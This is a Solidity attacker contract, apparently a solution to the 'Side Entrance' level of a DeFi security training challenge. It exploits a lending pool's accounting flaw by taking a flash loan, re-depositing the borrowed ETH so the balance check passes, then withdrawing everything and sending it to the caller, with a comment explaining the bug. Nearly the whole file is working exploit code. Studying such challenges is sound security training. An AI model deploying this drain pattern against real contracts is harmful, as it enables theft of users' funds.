// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceLenderPoolAttacker {
    SideEntranceLenderPool public immutable pool;

    constructor(address SideEntranceLenderPoolAddress) {
        pool = SideEntranceLenderPool(SideEntranceLenderPoolAddress);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function attack() public {
        /*
        flashLoan check if balance of the pool on the end is no less
        than on the begining. But the pool has two place where blances are been written.
        The first is balanse of the whole contract, the second one is mapping balances.
        So if we borrow Eth and deposite it, the balance of whole contract won't
        change. After we just need to withdraw all Eth.  
        */
        pool.flashLoan(address(pool).balance);

        pool.withdraw();

        (bool sent, ) = payable(msg.sender).call{value: address(this).balance}(
            ""
        );
        require(sent, "Eth did't sent to msg.sender");
    }

    receive() external payable {}
}
